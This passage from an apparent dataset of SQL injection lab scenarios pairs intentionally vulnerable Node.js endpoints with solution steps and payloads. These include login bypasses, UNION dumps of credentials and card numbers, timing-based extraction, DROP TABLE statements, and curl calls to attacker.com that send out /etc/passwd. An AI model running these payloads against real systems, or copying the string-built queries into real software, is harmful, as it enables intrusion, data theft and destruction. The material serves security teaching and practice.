    ]
  },
  {
    "Lab scenario": "CRM Application - Time-Based SQL Injection in Login Form",
    "Lab Description": "A Customer Relationship Management (CRM) application has a vulnerable login system. Although errors are suppressed, an attacker can infer SQL injection by measuring time delays. This lab uses PostgreSQL's `pg_sleep` to demonstrate blind SQL injection through the username field, allowing attackers to brute-force credentials using conditional delays.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit login form with payload: admin' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
      "Measure server response time",
      "Automate using sqlmap: `sqlmap -u /login -p username --technique=T --delay=5`",
      "Infer data via bitwise delay exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  pool.query(query, (err, result) => {\n    if (result && result.rows.length > 0) {\n      res.send('Login success');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});",
    "payloads": [
      "admin' OR 1=1--",
      "admin' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
    ]
  },
  {
    "Lab scenario": "Payment Processor - Boolean-Blind SQLi in Transaction Logs",
    "Lab Description": "A payment platform allows filtering logs via a query string parameter. The system only returns a status of 'true' or 'false', but the backend query is injectable. Attackers can infer sensitive payment info like card digits by manipulating boolean logic within the WHERE clause and observing the true/false behavior.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send request to /transactions/logs?filter=id=1 AND (SELECT substring(card_no,1,1)='4')",
      "Observe whether results exist (true) or not (false)",
      "Use binary search to extract full credit card numbers",
      "Automate using sqlmap or custom Python scripts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions/logs', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM payments WHERE ${filter}`;\n  pool.query(query, (err, result) => {\n    res.json({ found: result.rows.length > 0 });\n  });\n});",
    "payloads": [
      "1=1 AND substring((SELECT card_no FROM payments LIMIT 1),1,1)='4'--",
      "1=1 AND ascii(substring((SELECT card_no FROM payments LIMIT 1),1,1))>50--"
    ]
  },
  {
    "Lab scenario": "IoT Device Dashboard - SQLi via MQTT Message Injection",
    "Lab Description": "IoT telemetry data sent over MQTT is processed into a PostgreSQL database. The message handler lacks proper validation, allowing SQL injection via MQTT payloads. This lab focuses on out-of-band time-based attacks and showcases how IoT protocols can become attack surfaces.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept MQTT traffic (topic: telemetry/data)",
      "Publish payload: {'device_id': 'dev1'; SELECT pg_sleep(5)--', 'value': 20}",
      "Measure backend delay",
      "Extract data conditionally through timed responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "mqttClient.on('message', (topic, message) => {\n  const data = JSON.parse(message);\n  const query = `INSERT INTO telemetry (device_id, reading) VALUES ('${data.device_id}', ${data.value})`;\n  pool.query(query);\n});",
    "payloads": [
      "'; SELECT pg_sleep(5)--",
      "'; SELECT CASE WHEN (SELECT COUNT(*) FROM devices)>0 THEN pg_sleep(5) END--"
    ]
  },
  {
    "Lab scenario": "Support Portal - Second-Order SQL Injection in Ticket System",
    "Lab Description": "The application stores user-submitted tickets that are later used in admin SQL queries. The stored malicious data becomes effective only after a separate action triggers it, demonstrating second-order SQL injection. The attacker poisons input via the ticket submission page and waits for it to be processed in a vulnerable report generation feature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a ticket with subject: test'); DROP TABLE tickets;--",
      "Wait for admin to generate daily summary",
      "Confirm impact by observing missing records",
      "Modify payload to exfiltrate data instead of destruction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/submit_ticket', (req, res) => {\n  const { subject, message } = req.body;\n  const query = `INSERT INTO tickets (subject, message) VALUES ('${subject}', '${message}')`;\n  pool.query(query);\n  res.send('Ticket submitted');\n});\n\napp.get('/admin/reports', (req, res) => {\n  const query = `SELECT * FROM tickets WHERE subject LIKE '%${req.query.search}%'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "'); DROP TABLE tickets;--",
      "'); INSERT INTO secrets SELECT * FROM users;--"
    ]
  },
  {
    "Lab scenario": "SaaS Analytics - SQLi in Export Feature Using Stacked Queries",
    "Lab Description": "The export CSV feature builds a dynamic query based on filters and directly executes it. Attackers can append stacked queries using semicolons to create new tables, copy data, or trigger remote command execution (PostgreSQL COPY FROM PROGRAM). This lab simulates privilege escalation via SQLi.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Request: /export?filter=1; COPY users TO PROGRAM 'curl http://attacker.com/exfil.txt'--",
      "Trigger the endpoint and monitor attacker server",
      "Validate stolen credentials via crafted CSV output"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM usage WHERE ${filter}) TO STDOUT WITH CSV`;\n  pool.query(query);\n  res.send('Exported');\n});",
    "payloads": [
      "1; DROP TABLE usage;--",
      "1; COPY users TO PROGRAM 'curl http://attacker.com?data=$(cat /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "Mobile App Backend - JSON-Based SQLi via REST API",
    "Lab Description": "A mobile app sends JSON bodies to an API endpoint that joins JSON values into SQL filters. An attacker can exploit this by inserting SQL logic within array elements, bypassing filters and leaking authentication tokens. The vulnerability stems from improper concatenation of JSON strings into SQL clauses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send POST to /api/filter with body: { \"filters\": [\"1=1 UNION SELECT token,NULL FROM auth_tokens--\"] }",
      "Check API response for token leaks",
      "Automate with script that manipulates filter elements"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/filter', (req, res) => {\n  const filters = req.body.filters.join(' OR ');\n  const query = `SELECT * FROM users WHERE ${filters}`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "\"1=1 UNION SELECT token,NULL FROM auth_tokens--\"",
      "\"1=1 OR EXISTS(SELECT * FROM users)--\""
    ]
  },
  {
    "Lab scenario": "Blog Engine - Union SQLi via Tag Search",
    "Lab Description": "The blog application offers tag-based article filtering. Tags are concatenated into a WHERE clause with no sanitization, leading to a UNION-based SQL injection vulnerability. An attacker can extract full user records by appending a secondary query into the tag filter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access: /articles?tag=tech' UNION SELECT username,password FROM users--",
      "Verify the presence of user credentials in response",
      "Use different UNION column count if needed"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/articles', (req, res) => {\n  const tag = req.query.tag;\n  const query = `SELECT * FROM articles WHERE tag='${tag}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "tech' UNION SELECT username,password FROM users--",
      "dev' OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Admin Panel - SQLi via Cookie Injection",
    "Lab Description": "The admin dashboard uses cookie-based authentication, which is parsed and inserted into a query without sanitization. A malicious user can modify their cookie value to execute SQL injection and access admin-only resources or dump data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set Cookie: auth=admin' OR '1'='1",
      "Access /admin endpoint and confirm access",
      "Use payload to UNION SELECT table names"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/admin', (req, res) => {\n  const auth = req.cookies.auth;\n  const query = `SELECT * FROM admins WHERE username='${auth}'`;\n  pool.query(query, (err, result) => {\n    if (result.rows.length > 0) {\n      res.send('Admin Access');\n    } else {\n      res.status(403).send('Access Denied');\n    }\n  });\n});",
    "payloads": [
      "admin' OR '1'='1--",
      "' UNION SELECT NULL,password FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQLi in CSV Export Order Clause",
    "Lab Description": "A financial report export feature in a banking portal directly concatenates user-controlled sorting parameters into an ORDER BY clause within a PostgreSQL COPY command. The application leaks verbose errors containing sensitive database metadata. Attackers can exploit this to exfiltrate account balances and transaction histories by bypassing column type checks through explicit casting and UNION payloads. The vulnerability stems from improper input sanitization and debug-mode error reporting in production.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept POST /export CSV generation request using Burp Suite",
      "2. Identify injectable 'sort' parameter: sort=amount",
      "3. Determine column count: ' ORDER BY 7-- (Observe error at ORDER BY 8)",
      "4. Craft payload: amount UNION SELECT NULL,CAST(balance AS TEXT),NULL,NULL,NULL,NULL FROM accounts--",
      "5. Bypass CSV encapsulation using CHR(9) tab characters",
      "6. Parse stolen data from corrupted CSV file headers"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export', (req, res) => {\n  const sort = req.body.sort || 'date';\n  const query = `COPY (\n    SELECT id,date,amount,recipient\n    FROM transactions\n    ORDER BY ${sort}\n  ) TO STDOUT CSV HEADER`;\n\n  pool.query(query, (err) => {\n    if(err) {\n      console.error(`Full error: ${err.stack}`); // Debug leakage\n      res.status(500).send(err.message);\n    } else {\n      res.attachment('report.csv');\n    }\n  });\n});",
    "payloads": [
      "amount UNION SELECT NULL,CAST(CURRENT_USER AS TEXT),NULL,NULL,NULL,NULL--",
      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform JSON Array Injection with Type Confusion",
    "Lab Description": "A product search API processes JSON arrays containing filter conditions without type validation. Attackers can bypass parameterized queries by nesting objects and exploiting SQLite's dynamic typing system. This lab demonstrates credential extraction through type juggling and JSON aggregation functions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Set Content-Type: application/json",
      "2. Craft payload: {\"filters\":[{\"field\":\"1\",\"value\":\"1' UNION SELECT json_group_array(username||':'||password) FROM users--\"}]}",
      "3. Bypass WAF using Unicode escapes: \\u0027",
      "4. Parse concatenated credentials from JSON response",
      "5. Crack hashes using John the Ripper"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.filters\n    .map(f => `${f.field}=${f.value}`)\n    .join(' AND ');\n\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT sqlite_version(),1,1--\"}]",
      "[{\"field\":\"price\",\"value\":\"0 OR 1=1 UNION SELECT LOAD_EXTENSION('exploit.so'),NULL,NULL--\"}]"
    ]
  },
  {
    "Lab scenario": "Social Media Platform JWT-SQLi in Notifications",
    "Lab Description": "A notification system inserts JWT 'sub' claims directly into SQL queries without validation. Attackers can forge tokens with UNION payloads to hijack user sessions and exfiltrate private messages through malformed JSON responses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Decode JWT using jwt.io",
      "2. Modify 'sub' to: ' UNION SELECT message,user FROM inbox--",
      "3. Sign with 'none' algorithm",
      "4. Bypass CSRF tokens using CORS misconfiguration",
      "5. Parse messages from notification API response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/notifications', (req, res) => {\n  const userId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM notifications WHERE user_id='${userId}'`;\n\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,CONCAT(user,':',password) FROM users--",
      "'||(SELECT pg_read_file('/home/app/.env'))--"
    ]
  },
  {
    "Lab scenario": "Telemedicine Platform XML/SQL Polyglot Injection",
    "Lab Description": "A patient portal processes XML input containing CDATA-wrapped SQL fragments. Attackers can bypass XML entity encoding through hybrid polyglot payloads to extract sensitive medical records using PostgreSQL's xmlagg() function.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Wrap payload in CDATA: <![CDATA[' UNION SELECT xmlagg(XMLELEMENT(...)) FROM records--]]>",
      "2. Bypass XML validation using external entities",
      "3. Parse exfiltrated data from malformed XML responses",
      "4. Convert Base64-encoded results to PDF reports"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/telemed', (req, res) => {\n  const xml = req.rawBody;\n  const patientId = extractXPath(xml, '//patient/id');\n  const query = `SELECT * FROM records WHERE patient_id='${patientId}'`;\n\n  pool.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
    "payloads": [
      "<![CDATA[' UNION SELECT xmlagg(XMLELEMENT(NAME \"data\", diagnosis)) FROM records--]]>",
      "'||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT medical_history FROM patients))--"
    ]
  },
  {
    "Lab scenario": "Smart Home Dashboard  SQLi in Device Group Aggregation",
    "Lab Description": "The smart home admin dashboard allows users to aggregate device energy usage by group. The server-side logic dynamically builds the SQL `GROUP BY` and `ORDER BY` clauses based on user-supplied parameters. An attacker can exploit this by injecting a UNION-based payload through the group query, exfiltrating device secrets or configuration files. The vulnerability arises due to lack of input validation and direct string interpolation into SQL clauses. This mimics real-world attacks in IoT management platforms.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the `/device/stats?group=group_name` endpoint",
      "Inject: `1 UNION SELECT NULL, secret_key FROM device_configs--`",
      "Observe the leaked `secret_key` values in the response",
      "Automate using sqlmap with custom `--union-cols`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/stats', (req, res) => {\n  const groupBy = req.query.group;\n  const query = `SELECT ${groupBy}, SUM(power_usage) FROM devices GROUP BY ${groupBy}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.toString());\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "1 UNION SELECT NULL, secret_key FROM device_configs--",
      "1 UNION SELECT version(), NULL--"
    ]
  },
  {
    "Lab scenario": "Library Search Engine  SQLi via Boolean Conditions in Search Filter",
    "Lab Description": "A digital library platform allows users to search books using various filters including author and genre. The search input is vulnerable to Boolean-based blind SQL injection due to its dynamic usage in the `WHERE` clause without sanitization. By leveraging timing functions such as `pg_sleep` or `SLEEP`, an attacker can enumerate database content even when no output is directly returned. The challenge highlights data inference via blind channels and can simulate real-world research archive systems.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send POST request to `/search` with `{ \"filter\": \"author='Alice' AND 1=1\" }`",
      "Modify payload: `author='Alice' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users LIMIT 1))>5 THEN pg_sleep(5) ELSE pg_sleep(0) END)--`",
      "Measure response delay to infer password length",
      "Automate extraction with a binary search loop"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT * FROM books WHERE ${filter}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(\"Invalid filter\");\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "author='admin' AND 1=1--",
      "author='admin' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
    ]
  },
  {
    "Lab scenario": "Insurance Claim Portal  SQLi in Policy ID Lookup",
    "Lab Description": "An insurance web portal allows users to track claim status by providing a policy ID. The policy ID is directly concatenated into a SQL `WHERE` clause without proper escaping. This enables classic SQL injection attacks, allowing attackers to enumerate policy details, retrieve confidential claim attachments, and bypass access controls. This scenario mimics legacy financial services APIs that rely on ID-based filtering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit request to `/claims?policy_id=123`",
      "Inject: `123 OR 1=1--` to list all claims",
      "Use UNION to access additional tables: `123 UNION SELECT id, claimant_name, payout FROM sensitive_claims--`",
      "Dump sensitive data from the response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/claims', (req, res) => {\n  const policyId = req.query.policy_id;\n  const query = `SELECT * FROM claims WHERE policy_id=${policyId}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(400).send(\"Query failed\");\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "123 OR 1=1--",
      "123 UNION SELECT id, claimant_name, payout FROM sensitive_claims--"
    ]
  },
  {
    "Lab scenario": "Online Education Platform  SQLi via Feedback System",
    "Lab Description": "The course feedback system in a university's e-learning portal is vulnerable to stacked SQL injection. When students submit feedback, the comments are concatenated into a SQL statement used in administrative analysis reports. A malicious student can exploit this by submitting a comment that injects multiple SQL statements, enabling unauthorized access to staff tables or privilege escalation. The lab simulates real-world educational platforms that rely on weak report generators.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register as a student and submit feedback",
      "Inject comment: `Nice course'; DROP TABLE students;--`",
      "Observe server-side error and dropped tables",
      "Refine payload for exfiltration: `Great!'; COPY users TO PROGRAM 'curl http://attacker.com/$(cat /etc/passwd)'--`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/feedback', (req, res) => {\n  const comment = req.body.comment;\n  const courseId = req.body.course_id;\n  const query = `INSERT INTO feedback (course_id, comment) VALUES (${courseId}, '${comment}')`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(\"Failed to record feedback\");\n    res.send(\"Thank you for your feedback\");\n  });\n});",
    "payloads": [
      "Nice course'; DROP TABLE students;--",
      "Cool!'; COPY users TO PROGRAM 'curl http://attacker.com/$(whoami)'--"
    ]
  },
  {
    "Lab scenario": "Medical Record App  SQLi in Filtered Lab Test Results",
    "Lab Description": "A hospital management system provides an endpoint for querying lab test results filtered by test type. The SQL query uses the user input in a dynamic string with no validation, making it vulnerable to error-based SQL injection. The attacker can leverage PostgreSQL's error reporting to infer the structure of underlying tables and extract lab results or patient identifiers. This scenario is based on actual flaws seen in healthcare reporting interfaces.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access `/results?test_type=blood`",
      "Inject: `blood' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--`",
      "Review server errors exposing schema names",
      "Use error leakage to extract fields like `ssn`, `diagnosis`, etc."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/results', (req, res) => {\n  const testType = req.query.test_type;\n  const query = `SELECT * FROM tests WHERE type='${testType}'`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.toString());\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "blood' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
      "urine' OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Retail Chain API  SQLi via Internal Analytics Dashboard",
    "Lab Description": "A retail chain's internal dashboard accepts analytics queries via a web UI, where filter strings are passed to a SQL backend. Due to weak validation, attackers can inject time-based SQL payloads to exfiltrate sensitive inventory and sales data, especially when UNION-based methods are blocked. The attack vector uses PostgreSQL's `pg_sleep` and conditional subqueries, ideal for time-based inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit payload: `region='West' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT name FROM products LIMIT 1),1,1))>77 THEN pg_sleep(5) ELSE pg_sleep(0) END)--`",
      "Measure response delays using curl and bash",
      "Extract product names character by character"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/analytics', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT * FROM analytics WHERE ${filter}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(400).send(\"Bad filter\");\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "region='East' AND 1=1--",
      "region='West' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(3) END)--"
    ]
  },
  {
    "Lab scenario": "University Login Panel  SQLi Bypass via Cookie Manipulation",
    "Lab Description": "The login system of a university portal relies on a user-supplied `auth_token` cookie, which is directly included in a SQL query. An attacker can forge the token to include a SQLi payload, bypassing authentication checks. This lab simulates real-world flaws in legacy systems where session data is not validated cryptographically.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify cookie: `auth_token=admin'--`",
      "Access restricted area via forged token",
      "Use UNION to fetch admin password hash: `admin' UNION SELECT password FROM users WHERE role='admin'--`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/dashboard', (req, res) => {\n  const token = req.cookies.auth_token;\n  const query = `SELECT * FROM sessions WHERE token='${token}'`;\n  pool.query(query, (err, result) => {\n    if (err || result.rows.length === 0) return res.status(403).send(\"Access denied\");\n    res.send(\"Welcome back!\");\n  });\n});",
    "payloads": [
      "admin'--",
      "admin' UNION SELECT password FROM users WHERE username='admin'--"
    ]
  },
  {
    "Lab scenario": "Internal Admin Panel  SQLi in Role Assignment",
    "Lab Description": "An internal admin panel allows assigning roles to users through a vulnerable SQL query concatenated with user-controlled input. The input is directly passed to the SQL `UPDATE` query without proper sanitization. An attacker with limited access can escalate privileges by injecting into the role assignment input field. This scenario simulates a common misconfiguration where admin interfaces are assumed safe and are poorly validated.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as a low-privileged user with access to the role assignment interface",
      "Capture the POST request to `/admin/assign-role`",
      "Modify the `username` parameter to inject: `john'; UPDATE users SET role='admin' WHERE username='attacker`",
      "Observe successful privilege escalation by logging out and back in as `attacker`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/admin/assign-role', (req, res) => {\n  const username = req.body.username;\n  const role = req.body.role;\n  const sql = `UPDATE users SET role='${role}' WHERE username='${username}'`;\n  db.query(sql, (err) => {\n    if (err) return res.status(500).send('Database error');\n    res.send('Role updated');\n  });\n});",
    "payloads": [
      "john'; UPDATE users SET role='admin' WHERE username='attacker",
      "admin'; DROP TABLE logs;--"
    ]
  },
  {
    "Lab scenario": "Payment History Portal  SQLi in Dynamic Column Filter",
    "Lab Description": "The application backend allows users to search their payment history by various columns like `amount`, `status`, or `method`. The filter column name is user-controlled and directly used in the SQL query, leading to a classic SQLi vulnerability through the `ORDER BY` clause. An attacker can exploit this to inject malicious SQL and dump the full transaction history or manipulate sorting logic.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a GET request to `/payments?sort=amount`",
      "Inject payload: `1; SELECT version();--` in the `sort` parameter",
      "Use UNION-based injection to retrieve transaction secrets or configuration info",
      "Use pg_sleep for time-based confirmation if blind"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/payments', (req, res) => {\n  const sort = req.query.sort;\n  const sql = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Query error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount; SELECT pg_sleep(5)--",
      "id; DROP TABLE transactions--"
    ]
  },
  {
    "Lab scenario": "NGO Donor Portal  SQLi via Search Field with LIKE",
    "Lab Description": "The NGO's donation search feature is vulnerable due to unsanitized use of user input in a `LIKE` clause. Attackers can inject SQL using special characters and extract sensitive donor information such as email addresses, donation amount, and messages. This is a common real-world vulnerability due to poor filter design in keyword searches.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GET request: `/search?q=%' OR 1=1--`",
      "Use UNION to select data from `donors` table",
      "Use boolean-based blind SQLi to extract field-by-field info",
      "Automate the exploit using sqlmap"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const q = req.query.q;\n  const sql = `SELECT * FROM donations WHERE message LIKE '%${q}%'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
    "payloads": [
      "%' OR 1=1--",
      "%' UNION SELECT null,email,null FROM donors--"
    ]
  },
  {
    "Lab scenario": "GraphQL Backend  SQL Injection in Resolver Function",
    "Lab Description": "A GraphQL resolver directly includes user input from a search query in the SQL statement, making it vulnerable to SQL injection. The injection point is in the GraphQL `searchProducts(term: String)` operation. Exploiting this can lead to arbitrary SQL execution and access to sensitive product inventory details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a GraphQL query with a malicious `term` parameter",
      "Inject: `'; DROP TABLE inventory;--` or UNION injections",
      "Send request via GraphQL playground or API client",
      "Retrieve sensitive data from inventory or logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    searchProducts: async (_, { term }) => {\n      const sql = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n      return await db.query(sql);\n    }\n  }\n};",
    "payloads": [
      "'; DROP TABLE inventory;--",
      "' UNION SELECT credit_card FROM payments--"
    ]
  },
  {
    "Lab scenario": "Travel Booking  SQLi in Country Filter with Enumeration",
    "Lab Description": "This application lets users filter travel packages by country. However, the country parameter is unsanitized and directly included in the SQL query. This allows attackers to enumerate packages in other users accounts by bypassing country-level access control using injection in the filter parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GET request to `/packages?country=Italy`",
      "Inject: `Italy' OR 1=1--` to bypass country filter",
      "Use UNION to join with customer table",
      "Dump names and emails using crafted payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/packages', (req, res) => {\n  const country = req.query.country;\n  const sql = `SELECT * FROM travel_packages WHERE country='${country}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(500).send('Error fetching packages');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "Italy' OR 1=1--",
      "France' UNION SELECT name,email FROM users--"
    ]
  },
  {
    "Lab scenario": "Cloud Service  SQL Injection in API Key Authorization",
    "Lab Description": "A cloud service uses a weak implementation for API key lookup. It concatenates the `x-api-key` header value directly into a query. A malicious actor could modify the header and extract data from other tenants records or even bypass authentication altogether.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Send a GET request with crafted header: `x-api-key: key123' OR 1=1--`",
      "Access unauthorized resources via API response",
      "Test error-based injection to extract schema info",
      "Use time-based injection if output is blind"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/data', (req, res) => {\n  const apiKey = req.headers['x-api-key'];\n  const sql = `SELECT * FROM clients WHERE api_key='${apiKey}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(401).send('Invalid key');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "key123' OR 1=1--",
      "key123' UNION SELECT password FROM users--"
    ]
  },
  {
    "Lab scenario": "Employee Portal  SQL Injection in Login Field",
    "Lab Description": "The login form for internal employee authentication takes the username and password and embeds them directly into a SQL query. There is no use of prepared statements or sanitization, making it highly vulnerable. This classic injection can be used to bypass login and access internal records.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter `' OR '1'='1` as username and anything as password",
      "Observe login success without valid credentials",
      "Use UNION to extract employee emails from database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const user = req.body.username;\n  const pass = req.body.password;\n  const sql = `SELECT * FROM employees WHERE username='${user}' AND password='${pass}'`;\n  db.query(sql, (err, result) => {\n    if (result.length > 0) res.send('Welcome!');\n    else res.status(401).send('Unauthorized');\n  });\n});",
    "payloads": [
      "' OR '1'='1",
      "' UNION SELECT email FROM employees--"
    ]
  },
  {
    "Lab scenario": "Mobile API  SQL Injection in JSON Body Parameter",
    "Lab Description": "The mobile application sends JSON data containing search filters. The backend fails to validate or sanitize the `title` parameter in the JSON body. An attacker could send a malicious JSON payload to inject arbitrary SQL into the backend and retrieve internal documents.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send POST request: `{ \"title\": \"' OR 1=1--\" }`",
      "Use injection to list confidential documents",
      "Explore time-based and error-based techniques if needed"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const title = req.body.title;\n  const sql = `SELECT * FROM docs WHERE title='${title}'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' UNION SELECT body FROM docs--"
    ]
  },
  {
    "Lab scenario": "Support Chat System  SQL Injection via Cookie Parameter",
    "Lab Description": "The application identifies users using a session cookie that is directly passed to a SQL query. If an attacker modifies the cookie value to include SQL, it can be used to retrieve or manipulate chat history, impersonate another user, or drop session tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture cookie `session_id=abc123` and modify to `abc123' OR '1'='1`",
      "Inject via Burp Suite or browser extension",
      "Observe chat history from multiple users returned"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/chats', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  const sql = `SELECT * FROM messages WHERE session_id='${sessionId}'`;\n  db.query(sql, (err, messages) => {\n    if (err) return res.status(500).send('Chat fetch failed');\n    res.json(messages);\n  });\n});",
    "payloads": [
      "abc123' OR '1'='1",
      "xyz789' UNION SELECT content FROM logs--"
    ]
  },
  {
    "Lab scenario": "Banking API UNION-Based SQLi with Column Padding",
    "Lab Description": "A financial transactions API endpoint directly incorporates unsanitized user input into ORDER BY clauses of PostgreSQL queries. The application returns verbose errors containing full query syntax and database structure. Attackers can bypass column count restrictions through NULL padding and explicit type casting to extract SHA-256 hashed PIN codes from the accounts table. The vulnerability stems from debug-mode error handling in production and lack of parameterized queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept GET /transactions?sort=date request using Burp Suite",
      "2. Determine column count: ' ORDER BY 7-- (observe error at ORDER BY 8)",
      "3. Identify string-compatible columns: ' UNION SELECT NULL,'test',NULL,NULL,NULL,NULL,NULL--",
      "4. Extract PIN hashes: ' UNION SELECT NULL,CAST(pin_hash AS TEXT),NULL,NULL,NULL,NULL,NULL FROM accounts--",
      "5. Bypass WAF using URL-encoded whitespace (%09 for tabs)",
      "6. Crack hashes using rainbow tables with banking-specific salts"
    ],
    "Vulnerability name": "SQL injection",
